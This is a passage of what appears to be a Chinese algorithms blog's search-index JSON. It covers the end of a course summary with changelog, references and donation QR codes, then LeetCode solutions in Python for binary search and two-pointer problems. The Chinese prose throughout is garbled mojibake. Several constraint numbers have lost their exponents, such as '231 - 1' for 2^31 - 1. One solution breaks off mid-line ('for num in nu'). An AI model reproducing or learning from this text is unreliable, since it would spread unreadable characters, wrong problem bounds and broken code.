æ–°å¢`01èƒŒåŒ…`é—®é¢˜\n- å®Œå–„`åŠ¨æ€è§„åˆ’`åˆ†æ\n- æ–°å¢`è¿‘ä¼¼ç®—æ³•`éƒ¨åˆ†ç« èŠ‚\n\n### v 1.3(2021-11-27)\n\n- å®Œå–„`åˆ†æ²»ç®—æ³•`ç« èŠ‚\n- æ–°å¢`å†å¹´æœŸæœ«çœŸé¢˜`ç« èŠ‚\n- å®Œå–„`è¿‘ä¼¼ç®—æ³•`ç« èŠ‚\n- å®Œå–„è´ªå¿ƒç®—æ³•`æ­£ç¡®æ€§è¯æ˜`\n- ä¼˜åŒ–æ•´ä½“`æ–‡ç« ç»“æ„`\n- ä¿®æ”¹è‹¥å¹²`å·²çŸ¥é”™è¯¯`(æ„Ÿè°¢@whh)\n\n### v 1.4(2021-12-07)\n\n- ä¼˜åŒ–`NPå®Œå¤‡æ€§ç†è®º`ç« èŠ‚\n- å®Œå–„`å†å¹´æœŸæœ«çœŸé¢˜`ç« èŠ‚\n- ä¿®æ”¹è‹¥å¹²`å·²çŸ¥é”™è¯¯`(æ„Ÿè°¢è‹¥å¹²ä¸çŸ¥åè¯»è€…)\n\n### To Do\n\n- [ ] å®Œå–„NPå®Œå¤‡æ€§ç†è®ºç« èŠ‚\n- [ ] å®Œå–„è¿‘ä¼¼ç®—æ³•ç« èŠ‚\n\n## â‘«ReferenceğŸ“–\n\n**ä¹¦ç±**\n\n- ã€Šç®—æ³•è®¾è®¡ã€‹ Kleinbergï¼ŒJ. ï¼ŒTardosï¼ŒE.  è‘—ï¼›å¼ ç«‹æ˜‚ï¼Œå±ˆå©‰ç² è¯‘\n- ã€Šè®¡ç®—æœºç®—æ³•è®¾è®¡ä¸åˆ†æã€‹ç‹æ™“ä¸œ è‘—\n- ã€Šç®—æ³•å›¾è§£ã€‹ Aditya Bhargava è‘— ï¼›è¢å›½å¿  è¯‘\n- ã€Šå¤§è¯æ•°æ®ç»“æ„ã€‹ç¨‹æ° è‘—\n\n**è´ªå¿ƒç®—æ³•**\n\n- [AIäº§å“ç»ç†å¿…ä¿®â€”â€”æ­å¼€ç®—æ³•çš„é¢çº±ï¼ˆè´ªå¿ƒç®—æ³•ï¼‰](http://www.woshipm.com/pmd/4044055.html)\n- [è´ªå¿ƒç®—æ³•åˆ·å®Œè¿™äº›é¢˜ç›®å°±å¤Ÿäº† - SegmentFault æ€å¦](https://segmentfault.com/a/1190000038224322)\n- [äº”å¤§ç»å…¸ç®—æ³•|2.è´ªå¿ƒç®—æ³• - å¼ æµ©åœ¨è·¯ä¸Š](https://imzhanghao.com/2020/04/15/5-classic-algorithms-2-greedy-algorithm/)\n- [æ´»åŠ¨å®‰æ’é—®é¢˜-è®¡ç®—æœºç®—æ³•_ç¬¨æ‰‹ç¬¨è„šÂ°çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_43424037/article/details/107175891)\n- [ è´ªå¿ƒç®—æ³•çš„æ­£ç¡®æ€§è¯æ˜](https://blog.csdn.net/pkueecscss/article/details/88578060)\n- [ACM--è´ªå¿ƒç®—æ³•--æ´»åŠ¨å®‰æ’é—®é¢˜_æˆç äººç”Ÿ-CSDNåšå®¢](https://blog.csdn.net/qq_26891045/article/details/51025619)\n- [æ´»åŠ¨å®‰æ’é—®é¢˜è´ªå¿ƒè¯æ˜_AKGWSB 's blog-CSDNåšå®¢](https://blog.csdn.net/weixin_44176696/article/details/105705481)\n- [USTC-ç®—æ³•åŸºç¡€-è´ªå¿ƒç®—æ³•](http://staff.ustc.edu.cn/~lszhuang/alg/ch16.pdf)\n\n**åˆ†æ²»**\n\n- [ã€ç®—æ³•16ã€‘é€’å½’ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ç»ˆç»“ç¯‡](https://www.cnblogs.com/python27/archive/2011/12/09/2282486.html)\n- [ä¸»å®šç†(Master Theorem) - çŸ¥ä¹](https://zhuanlan.zhihu.com/p/113406812)\n- [ç®—æ³•è®¾è®¡ä¸åˆ†æ - ä¸»å®šç† - HIIM - åšå®¢å›­](https://www.cnblogs.com/HIIM/p/12499319.html)\n\n**åŠ¨æ€è§„åˆ’**\n\n- [åŠ¨æ€è§„åˆ’---ï¼çŸ©é˜µè¿ä¹˜é—®é¢˜](https://blog.csdn.net/wu246051/article/details/111464029?spm=1001.2014.3001.5501)\n- [çŸ©é˜µè¿ä¹˜é—®é¢˜-åŠ¨æ€è§„åˆ’](https://blog.csdn.net/qq_43424037/article/details/106971000)\n- [ ç®—æ³•ä¹‹åŠ¨æ€è§„åˆ’ï¼Œé—®é¢˜äºŒï¼šå¸¦æƒé‡çš„ä»»åŠ¡å®‰æ’é—®é¢˜_æˆ‘çˆ±åŠ è²çŒ«](https://blog.csdn.net/weixin_39956356/article/details/101623749)\n- [åŠ¨æ€è§„åˆ’ç®—æ³• | èˆªè¡Œå­¦å›­ ](http://www.voycn.com/article/dongtaiguihuasuanfa)\n- [åŠ¨æ€è§„åˆ’ç®—æ³•_bajiaoyu517çš„åšå®¢](https://blog.csdn.net/bajiaoyu517/article/details/109524684)\n- [ç®—æ³•ä¹‹åŠ¨æ€è§„åˆ’ï¼Œé—®é¢˜ä¸‰ï¼š0 1 èƒŒåŒ…é—®é¢˜_æˆ‘çˆ±åŠ è²çŒ«](https://blog.csdn.net/weixin_39956356/article/details/101695289)\n- [æœ€é•¿å…¬å…±å­åºåˆ—é—®é¢˜å’Œæœ€é•¿å…¬å…±å­ä¸²é—®é¢˜ - Excaliburer - åšå®¢å›­](https://www.cnblogs.com/wangkundentisy/p/9346376.html)\n\n**ç½‘ç»œæµ**\n\n- [ç½‘ç»œæµé—®é¢˜åŸºç¡€ Network Flow Problems](https://www.bilibili.com/video/BV1K64y1C7Do/?spm_id_from=333.788.recommend_more_video.0)\n- [ç½‘ç»œæµç®—æ³•ç®€å•å…¥é—¨ - è¾°æ˜Ÿå‡Œ - åšå®¢å›­](https://www.cnblogs.com/Xing-Ling/p/11487554.html)\n- [ç½‘ç»œæµç®€ä»‹ - OI Wiki (oi-wiki.org)](https://oi-wiki.org/graph/flow/)\n\n**NPå®Œå¤‡æ€§ç†è®º**\n\n- [ ç®—æ³•è®¾è®¡ä¸åˆ†æ-å½’çº¦ä¸å¤æ‚åº¦çš„NPé—®é¢˜ä»¥åŠè¿‘ä¼¼ç®—æ³•_lyly1995çš„åšå®¢](https://blog.csdn.net/lyly1995/article/details/109959064?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link)\n- [å¤šé¡¹å¼æ—¶é—´å½’çº¦ | | æ¸…æ°´å¯ºä¿®è¡Œç”Ÿæ´»è®°å½•](https://www.ivdone.top/article/57.html)\n- [å¤šé¡¹å¼è§„çº¦_å°èœèœforeverçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_37657182/article/details/102969574)\n- [ç®—æ³•è®¾è®¡ä¸åˆ†æç¬”è®°ä¹‹ç‹¬ç«‹é›†é—®é¢˜ - ç®€ä¹¦](https://www.jianshu.com/p/ddae993cc065)\n- [å¤šé¡¹å¼è§„çº¦â€”â€”ç»­_å°èœèœforeverçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_37657182/article/details/103001996)\n- [ç®—æ³•è®¾è®¡ä¸åˆ†æç¬”è®°ä¹‹æ•´æ•°è§„åˆ’](https://www.jianshu.com/p/024892e7cf04)\n- [é«˜çº§ç®—æ³• | AdAlgo ](https://sailist.github.io/AdAlgo/)\n\n**è¿‘ä¼¼ç®—æ³•**\n\n- [ç®—æ³•è®¾è®¡ä¸åˆ†æä¹‹è¿‘ä¼¼ç®—æ³•_çŒ¿å½’æ—çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_44075108/article/details/110604404?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.no_search_link&spm=1001.2101.3001.4242.2)\n- [è¿‘ä¼¼ç®—æ³•_å°èœèœforeverçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_37657182/article/details/103056025?spm=1001.2014.3001.5502)\n- [ç®—æ³•åŸºç¡€ - ç®€ä¹¦](https://www.jianshu.com/p/dac9620ec051)\n- [Yangçš„åèŠ±å›­](http://zhangxiaoyang.me/categories/intro-to-algorithms-tutorial/intro-to-algorithms-tutorial-9.html)\n- [ustc.edu.cn](http://staff.ustc.edu.cn/~xiaomj/teaching/sf10.pdf)\n- [ç®—æ³•è®¾è®¡ä¸åˆ†æç¬”è®°ä¹‹è¿‘ä¼¼ç®—æ³• - ç®€ä¹¦](https://www.jianshu.com/p/d8d7aa16f53f)\n\n## â‘¬Sponsorâ¤ï¸\n\næœ¬æ–‡æ˜¯ UESTC ç ”ä¸€ ã€Šé«˜çº§ç®—æ³•è®¾è®¡ä¸åˆ†æã€‹è¯¾ç¨‹æ€»ç»“ï¼Œæ€»ç»“å¾—ä¸ä¸€å®šå®Œå–„ä¸ä¸€å®šå®Œç¾ï¼Œä½†æ˜¯ä»æŸ¥é˜…èµ„æ–™ï¼Œåˆ°ç”»å›¾æ„æ€ï¼Œå†åˆ°æ–‡ç« ç¼–å†™å‰åä¹Ÿç»å†äº†å¤§æ¦‚ä¸€ä¸ªå¤šæœˆçš„æ—¶é—´ï¼Œåœ¨è¿™ä¸ªå–§åš£æµ®èºçš„æ—¶ä»£ï¼Œä¸ªäººåšå®¢è¶Šæ¥è¶Šæ²¡æœ‰äººçœ‹äº†ï¼Œå†™åšå®¢æ„Ÿè§‰ä¸€ç›´æ˜¯ç”¨çˆ±å‘ç”µçš„çŠ¶æ€ã€‚å¦‚æœä½ æ°å·§è´¢åŠ›é›„åšï¼Œæ„Ÿè§‰æœ¬æ–‡å¯¹ä½ æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ã€‚\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>\n  </tr>\n</tbody></table>\n\n\n","tags":["ç®—æ³•"],"categories":["ç»“æ„-ç®—æ³•"]},{"title":"LeetCode ç®—æ³•å…¥é—¨","url":"/posts/9409.html","content":"\næ„Ÿè§‰è‡ªå·±çš„ç®—æ³•å’Œç¼–ç¨‹å¤ªå¼±äº†ğŸ˜­ï¼Œæ•…æ¯å¤©åœ¨ LeetCode ä¸Šåˆ·ä¸€ä¸¤é“ç®—æ³•é¢˜ï¼Œå¸Œæœ›æ…¢æ…¢æé«˜è‡ªå·±çš„ç®—æ³•èƒ½åŠ›å’Œç¼–ç¨‹èƒ½åŠ›ï¼Œä»ç®€å•çš„é¢˜ç›®å¼€å§‹æ…¢æ…¢åˆ·å§ï¼Œçœ‹çœ‹è‡ªå·±èƒ½åšæŒå¤šä¹…ï¼Œfightingæ˜¯ğŸ’ªï¼ï¼ï¼\n\n## äºŒåˆ†æŸ¥æ‰¾\n\n### 704. äºŒåˆ†æŸ¥æ‰¾\n\n#### é¢˜ç›®\n\nç»™å®šä¸€ä¸ª n ä¸ªå…ƒç´ æœ‰åºçš„ï¼ˆå‡åºï¼‰æ•´å‹æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ target  ï¼Œå†™ä¸€ä¸ªå‡½æ•°æœç´¢ nums ä¸­çš„ targetï¼Œå¦‚æœç›®æ ‡å€¼å­˜åœ¨è¿”å›ä¸‹æ ‡ï¼Œå¦åˆ™è¿”å› -1ã€‚\n\n\nç¤ºä¾‹ 1:\n\n```\nè¾“å…¥: nums = [-1,0,3,5,9,12], target = 9\nè¾“å‡º: 4\nè§£é‡Š: 9 å‡ºç°åœ¨ nums ä¸­å¹¶ä¸”ä¸‹æ ‡ä¸º 4\n```\n\nç¤ºä¾‹ 2:\n\n```\nè¾“å…¥: nums = [-1,0,3,5,9,12], target = 2\nè¾“å‡º: -1\nè§£é‡Š: 2 ä¸å­˜åœ¨ nums ä¸­å› æ­¤è¿”å› -1\n```\n\n#### è§£ç­”\n\näºŒåˆ†æŸ¥æ‰¾æ˜¯ä¸€ç§åŸºäºæ¯”è¾ƒç›®æ ‡å€¼å’Œæ•°ç»„ä¸­é—´å…ƒç´ çš„æ•™ç§‘ä¹¦å¼ç®—æ³•ã€‚\n\nå¦‚æœç›®æ ‡å€¼ç­‰äºä¸­é—´å…ƒç´ ï¼Œåˆ™æ‰¾åˆ°ç›®æ ‡å€¼ã€‚\nå¦‚æœç›®æ ‡å€¼è¾ƒå°ï¼Œç»§ç»­åœ¨å·¦ä¾§æœç´¢ã€‚\nå¦‚æœç›®æ ‡å€¼è¾ƒå¤§ï¼Œåˆ™ç»§ç»­åœ¨å³ä¾§æœç´¢ã€‚\n\n```python\nclass Solution:\n    \"\"\"äºŒåˆ†æŸ¥æ‰¾\"\"\"\n    def search(self, nums: List[int], target: int) -> int:\n        left, right = 0, len(nums) - 1\n        while left <= right:\n            mid = left + ((right -left) >> 1)\n            if nums[mid] == target:\n                return mid\n            elif target < nums[mid]:\n                right = mid - 1\n            else:\n                left = mid + 1\n        return -1\n```\n\n- 1ã€å¾ªç¯æ¡ä»¶ï¼š `left <= right`\n  - å¾ªç¯æ¡ä»¶åŒ…å«äº† `left == right`çš„æƒ…å†µï¼Œåˆ™æˆ‘ä»¬å¿…é¡»åœ¨æ¯æ¬¡å¾ªç¯ä¸­æ”¹å˜ `left` å’Œ `right`çš„æŒ‡å‘ï¼Œä»¥é˜²æ­¢è¿›å…¥æ­»å¾ªç¯ã€‚\n- 2ã€å¾ªç¯ç»ˆæ­¢æ¡ä»¶åŒ…æ‹¬ï¼š\n  - æ‰¾åˆ°äº†ç›®æ ‡å€¼\n  - `left > right` ï¼ˆè¿™ç§æƒ…å†µå‘ç”Ÿäºå½“left, mid, rightæŒ‡å‘åŒä¸€ä¸ªæ•°æ—¶ï¼Œè¿™ä¸ªæ•°è¿˜ä¸æ˜¯ç›®æ ‡å€¼ï¼Œåˆ™æ•´ä¸ªæŸ¥æ‰¾ç»“æŸã€‚ï¼‰\n- 3ã€ä¸­é—´ä½ç½®è®¡ç®—ï¼š `mid = left + ((right -left) >> 1)`\n  - `left + ((right -left) >> 1)` å…¶å®å’Œ `(left + right) / 2`æ˜¯ç­‰ä»·çš„ï¼Œè¿™æ ·å†™çš„ç›®çš„ä¸€ä¸ªæ˜¯ä¸ºäº†é˜²æ­¢ `(left + right)`å‡ºç°æº¢å‡ºï¼Œç”¨å³ç§»æ“ä½œ(`>>`)æ›¿ä»£é™¤æ³•æå‡äº†æ€§èƒ½ã€‚\n- 4ã€å·¦è¾¹ç•Œæ›´æ–°ï¼š`left = mid + 1`\n- 5ã€å³è¾¹ç•Œæ›´æ–°ï¼š `right = mid - 1`\n- 6ã€è¿”å›å€¼ï¼š `mid / -1`\n\n#### å¤æ‚åº¦\n\næ—¶é—´å¤æ‚åº¦ï¼š$\\mathcal{O}(\\log n)$â€‹\n\nç©ºé—´å¤æ‚åº¦ï¼š$\\mathcal{O}(1)$\n\n### 278. ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬\n\n#### é¢˜ç›®\n\nä½ æ˜¯äº§å“ç»ç†ï¼Œç›®å‰æ­£åœ¨å¸¦é¢†ä¸€ä¸ªå›¢é˜Ÿå¼€å‘æ–°çš„äº§å“ã€‚ä¸å¹¸çš„æ˜¯ï¼Œä½ çš„äº§å“çš„æœ€æ–°ç‰ˆæœ¬æ²¡æœ‰é€šè¿‡è´¨é‡æ£€æµ‹ã€‚ç”±äºæ¯ä¸ªç‰ˆæœ¬éƒ½æ˜¯åŸºäºä¹‹å‰çš„ç‰ˆæœ¬å¼€å‘çš„ï¼Œæ‰€ä»¥é”™è¯¯çš„ç‰ˆæœ¬ä¹‹åçš„æ‰€æœ‰ç‰ˆæœ¬éƒ½æ˜¯é”™çš„ã€‚\n\nå‡è®¾ä½ æœ‰ `n` ä¸ªç‰ˆæœ¬ `[1, 2, ..., n]`ï¼Œä½ æƒ³æ‰¾å‡ºå¯¼è‡´ä¹‹åæ‰€æœ‰ç‰ˆæœ¬å‡ºé”™çš„ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬ã€‚\n\nä½ å¯ä»¥é€šè¿‡è°ƒç”¨ `bool isBadVersion(version)` æ¥å£æ¥åˆ¤æ–­ç‰ˆæœ¬å· `version` æ˜¯å¦åœ¨å•å…ƒæµ‹è¯•ä¸­å‡ºé”™ã€‚å®ç°ä¸€ä¸ªå‡½æ•°æ¥æŸ¥æ‰¾ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬ã€‚ä½ åº”è¯¥å°½é‡å‡å°‘å¯¹è°ƒç”¨ API çš„æ¬¡æ•°ã€‚\n\nç¤ºä¾‹ 1ï¼š\n\n```\nè¾“å…¥ï¼šn = 5, bad = 4\nè¾“å‡ºï¼š4\nè§£é‡Šï¼š\nè°ƒç”¨ isBadVersion(3) -> false \nè°ƒç”¨ isBadVersion(5) -> true \nè°ƒç”¨ isBadVersion(4) -> true\næ‰€ä»¥ï¼Œ4 æ˜¯ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬ã€‚\n```\n\nç¤ºä¾‹ 2ï¼š\n\n```\nè¾“å…¥ï¼šn = 1, bad = 1\nè¾“å‡ºï¼š1\n```\n\n\næç¤ºï¼š\n\n```\n1 <= bad <= n <= 231 - 1\n```\n\n#### è§£ç­”\n\nå°†å·¦å³è¾¹ç•Œåˆ†åˆ«åˆå§‹åŒ–ä¸º 1 å’Œ nï¼Œå…¶ä¸­ n æ˜¯ç»™å®šçš„ç‰ˆæœ¬æ•°é‡ã€‚è®¾å®šå·¦å³è¾¹ç•Œä¹‹åï¼Œæ¯æ¬¡æˆ‘ä»¬éƒ½ä¾æ®å·¦å³è¾¹ç•Œæ‰¾åˆ°å…¶ä¸­é—´çš„ç‰ˆæœ¬ï¼Œæ£€æŸ¥å…¶æ˜¯å¦ä¸ºæ­£ç¡®ç‰ˆæœ¬ã€‚å¦‚æœè¯¥ç‰ˆæœ¬ä¸ºæ­£ç¡®ç‰ˆæœ¬ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬å¿…ç„¶ä½äºè¯¥ç‰ˆæœ¬çš„å³ä¾§ï¼Œæˆ‘ä»¬ç¼©ç´§å·¦è¾¹ç•Œï¼›å¦åˆ™ç¬¬ä¸€ä¸ªé”™è¯¯çš„ç‰ˆæœ¬å¿…ç„¶ä½äºè¯¥ç‰ˆæœ¬åŠè¯¥ç‰ˆæœ¬çš„å·¦ä¾§ï¼Œæˆ‘ä»¬ç¼©ç´§å³è¾¹ç•Œã€‚ç›´åˆ° left=rightï¼Œåªå‰©ä¸‹ä¸€ä¸ªæ•°äº†ï¼Œè¿™ä¸ªæ•°å°±æ˜¯ç¬¬ä¸€ä¸ªé”™è¯¯çš„ã€‚\n\n```python\nclass Solution:\n    def firstBadVersion(self, n):\n        \"\"\"\n        :type n: int\n        :rtype: int\n        \"\"\"\n        left, right =1, n\n        while left < right: \n            mid = left + ((right -left) >> 1)\n            if isBadVersion(mid):\n                right = mid     # ç­”æ¡ˆåœ¨åŒºé—´ [left, mid] ä¸­\n            else:\n                left = mid + 1  # ç­”æ¡ˆåœ¨åŒºé—´ [mid+1, right] ä¸­\n        return left             # æ­¤æ—¶æœ‰ left == rightï¼ŒåŒºé—´ç¼©ä¸ºä¸€ä¸ªç‚¹ï¼Œå³ä¸ºç­”æ¡ˆ\n```\n\n#### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ï¼š$\\mathcal{O}(\\log n)$â€‹ï¼Œå…¶ä¸­ n æ˜¯ç»™å®šç‰ˆæœ¬çš„æ•°é‡ã€‚\n- ç©ºé—´å¤æ‚åº¦ï¼š$\\mathcal{O}(1)$ã€‚æˆ‘ä»¬åªéœ€è¦å¸¸æ•°çš„ç©ºé—´ä¿å­˜è‹¥å¹²å˜é‡ã€‚\n\n### 35. æœç´¢æ’å…¥ä½ç½®\n\n#### é¢˜ç›®\n\nç»™å®šä¸€ä¸ªæ’åºæ•°ç»„å’Œä¸€ä¸ªç›®æ ‡å€¼ï¼Œåœ¨æ•°ç»„ä¸­æ‰¾åˆ°ç›®æ ‡å€¼ï¼Œå¹¶è¿”å›å…¶ç´¢å¼•ã€‚å¦‚æœç›®æ ‡å€¼ä¸å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œè¿”å›å®ƒå°†ä¼šè¢«æŒ‰é¡ºåºæ’å…¥çš„ä½ç½®ã€‚\n\nè¯·å¿…é¡»ä½¿ç”¨æ—¶é—´å¤æ‚åº¦ä¸º O(log n) çš„ç®—æ³•ã€‚\n\nç¤ºä¾‹ 1:\n\n```\nè¾“å…¥: nums = [1,3,5,6], target = 5\nè¾“å‡º: 2\n```\n\nç¤ºä¾‹ 2:\n\n```\nè¾“å…¥: nums = [1,3,5,6], target = 2\nè¾“å‡º: 1\n```\n\nç¤ºä¾‹ 3:\n\n```\nè¾“å…¥: nums = [1,3,5,6], target = 7\nè¾“å‡º: 4\n```\n\nç¤ºä¾‹ 4:\n\n```\nè¾“å…¥: nums = [1,3,5,6], target = 0\nè¾“å‡º: 0\n```\n\nç¤ºä¾‹ 5:\n\n```\nè¾“å…¥: nums = [1], target = 0\nè¾“å‡º: 0\n```\n\n\næç¤º:\n\n- 1 <= nums.length <= 104\n- -104 <= nums[i] <= 104\n- nums ä¸ºæ— é‡å¤å…ƒç´ çš„å‡åºæ’åˆ—æ•°ç»„\n- -104 <= target <= 104\n\n#### è§£ç­”\n\n```python\nclass Solution:\n    def searchInsert(self, nums: List[int], target: int) -> int:\n        left, right = 0, len(nums)- 1\n        while left <= right:\n            mid = left + ((right - left) >> 1)\n            if nums[mid] == target:\n                return mid\n            elif target < nums[mid]:\n                right = mid -1\n            else:\n                left = mid + 1\n        return  left\n```\n\n## åŒæŒ‡é’ˆ\n\n### 977.æœ‰åºæ•°ç»„çš„å¹³æ–¹\n\n#### é¢˜ç›®\n\nç»™ä½ ä¸€ä¸ªæŒ‰ éé€’å‡é¡ºåº æ’åºçš„æ•´æ•°æ•°ç»„ numsï¼Œè¿”å› æ¯ä¸ªæ•°å­—çš„å¹³æ–¹ ç»„æˆçš„æ–°æ•°ç»„ï¼Œè¦æ±‚ä¹ŸæŒ‰ éé€’å‡é¡ºåºæ’åºã€‚\n\nç¤ºä¾‹ 1ï¼š\n\n```\nè¾“å…¥ï¼šnums = [-4,-1,0,3,10]\nè¾“å‡ºï¼š[0,1,9,16,100]\nè§£é‡Šï¼šå¹³æ–¹åï¼Œæ•°ç»„å˜ä¸º [16,1,0,9,100]\næ’åºåï¼Œæ•°ç»„å˜ä¸º [0,1,9,16,100]\n```\n\nç¤ºä¾‹ 2ï¼š\n\n```\nè¾“å…¥ï¼šnums = [-7,-3,2,3,11]\nè¾“å‡ºï¼š[4,9,9,49,121]\n```\n\n\næç¤ºï¼š\n\n- 1 <= nums.length <= 104\n- -104 <= nums[i] <= 104\n- nums å·²æŒ‰ éé€’å‡é¡ºåº æ’åº\n\n\nè¿›é˜¶ï¼š\n\nè¯·ä½ è®¾è®¡æ—¶é—´å¤æ‚åº¦ä¸º O(n) çš„ç®—æ³•è§£å†³æœ¬é—®é¢˜\n\n#### è§£ç­”\n\næ–¹æ³•ä¸€ï¼šç›´æ¥æ’åº\n\n```python\nclass Solution:\n    def sortedSquares(self, nums: List[int]) -> List[int]:\n        return sorted(pow(num,2) for num in nu\n```\n\næ–¹æ³•äºŒï¼šåŒæŒ‡é’ˆ\n\næ–¹æ³•ä¸€æ²¡æœ‰åˆ©ç”¨ã€Œæ•°ç»„ nums å·²ç»æŒ‰ç…§å‡åºæ’åºã€è¿™ä¸ªæ¡ä»¶ã€‚\n\nå¦‚æœæ•°ç»„ nums  ä¸­çš„æ‰€æœ‰æ•°éƒ½æ˜¯éè´Ÿæ•°ï¼Œé‚£ä¹ˆå°†æ¯ä¸ªæ•°å¹³æ–¹åï¼Œæ•°ç»„ä»ç„¶ä¿æŒå‡åºï¼›å¦‚æœæ•°ç»„ nums ä¸­çš„æ‰€æœ‰æ•°éƒ½æ˜¯è´Ÿæ•°ï¼Œé‚£ä¹ˆå°†æ¯ä¸ªæ•°å¹³æ–¹åï¼Œæ•°ç»„ä¼šä¿æŒé™åºã€‚é‚£ä¹ˆæ•°ç»„å¹³æ–¹çš„æœ€å¤§å€¼å°±åœ¨æ•°ç»„çš„ä¸¤ç«¯ï¼Œä¸æ˜¯æœ€å·¦è¾¹å°±æ˜¯æœ€å³è¾¹ï¼Œä¸å¯èƒ½æ˜¯ä¸­é—´ã€‚\n\næ­¤æ—¶å¯ä»¥è€ƒè™‘åŒæŒ‡é’ˆæ³•äº†ï¼Œi æŒ‡å‘èµ·å§‹ä½ç½®ï¼Œj æŒ‡å‘ç»ˆæ­¢ä½ç½®ã€‚\n\nå®šä¹‰ä¸€ä¸ªæ–°åˆ—è¡¨ resï¼Œå’Œ nums åˆ—è¡¨ä¸€æ ·çš„å¤§å°ï¼Œè®© k æŒ‡å‘ res ç»ˆæ­¢ä½ç½®ã€‚\n\nå¦‚æœ`nums[i] * nums[i] < nums[j] * nums[j]` é‚£ä¹ˆ `result[k--] = A[j] * A[j]`\n\nå¦‚æœ `nums[i] * nums[i] >= nums[j] * nums[j]` é‚£ä¹ˆ`result[k--] = A[i] * A[i]`\n\n![ç®—æ³•å›¾è§£](https://img.jwt1399.top//img/20210729224442.gif)\n\n```python\nclass Solution:\n    def sortedSquares(self, nums: List[int]) -> List[int]:\n        i, j, k = 0, len(nums)-1, len(nums)-1\n        res = [-1] * len(nums)\n        while i <= j:\n            if nums[i] * nums[i] > nums[j] * nums[j]:\n                res[k] = nums[i] * nums[i]\n                i += 1\n            else:\n                res[k] = nums[j] * nums[j]\n                j -= 1\n            k -= 1\n        return res\n```\n\n### 189. æ—‹è½¬æ•°ç»„\n\n#### é¢˜ç›®\n\nç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œå°†æ•°ç»„ä¸­çš„å…ƒç´ å‘å³ç§»åŠ¨ `k` ä¸ªä½ç½®ï¼Œå…¶ä¸­ `k` æ˜¯éè´Ÿæ•°ã€‚\n\n**è¿›é˜¶ï¼š**\n\n- å°½å¯èƒ½æƒ³å‡ºæ›´å¤šçš„è§£å†³æ–¹æ¡ˆï¼Œè‡³å°‘æœ‰ä¸‰ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n- ä½ å¯ä»¥ä½¿ç”¨ç©ºé—´å¤æ‚åº¦ä¸º O(1) çš„ **åŸåœ°** ç®—æ³•è§£å†³è¿™ä¸ªé—®é¢˜å—ï¼Ÿ\n\n**ç¤ºä¾‹ 1:**\n\n```\nè¾“å…¥: nums = [1,2,3,4,5,6,7], k = 3\nè¾“å‡º: [5,6,7,1,2,3,4]\nè§£é‡Š:\nå‘å³æ—‹è½¬ 1 æ­¥: [7,1,2,3,4,5,6]\nå‘å³æ—‹è½¬ 2 æ­¥: [6,7,1,2,3,4,5]\nå‘å³æ—‹è½¬ 3 æ­¥: [5,6,7,1,2,3,4]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```\nè¾“å…¥ï¼šnums = [-1,-100,3,99], k = 2\nè¾“å‡ºï¼š[3,99,-1,-100]\nè§£é‡Š: \nå‘å³æ—‹è½¬ 1 æ­¥: [99,-1,-100,3]\nå‘å³æ—‹è½¬ 2 æ­¥: [3,99,-1,-100]\n```\n\n**æç¤ºï¼š**\n\n- `1 <= nums.length <= 2 * 104`\n- `-231 <= nums[i] <= 231 - 1`\n- `0 <= k <= 105`\n\n#### è§£ç­”\n\næˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªåˆ—è¡¨å°†æ¯ä¸ªå…ƒç´ æ”¾è‡³æ­£ç¡®çš„ä½ç½®ã€‚é¦–å…ˆéå†åŸåˆ—è¡¨ï¼Œå°†åŸåˆ—è¡¨ä¸‹æ ‡ä¸º i çš„å…ƒç´ æ”¾è‡³æ–°æ•°ç»„ä¸‹æ ‡ä¸º  (i+k) mod n çš„ä½ç½®ï¼Œå› ä¸ºæ²¡æœ‰è¿”å›å€¼ï¼Œæ‰€ä»¥é¢˜ç›®éªŒè¯çš„è¿˜æ˜¯åŸåˆ—è¡¨ï¼Œå› æ­¤æœ€åå°†æ–°æ•°ç»„æ‹·è´è‡³åŸæ•°ç»„å³å¯ã€‚\n\n```python\nclass Solution:\n    def rotate(self, nums: List[int], k: int) -> None:\n        \"\"\"\n        Do not return anything, modify nums in-place instead.\n        \"\"\"\n        res = [-1] * len(nums)\n        for i in range(len(nums)):\n            res[(i+k)%len(nums)] = nums[i]\n        for i in range(len(nums)):\n            nums[i] = res[i]\n```\n\n### 283. ç§»åŠ¨é›¶\n\n### é¢˜ç›®\n\nç»™å®šä¸€ä¸ªæ•°ç»„ `nums`ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°å°†æ‰€æœ‰ `0` 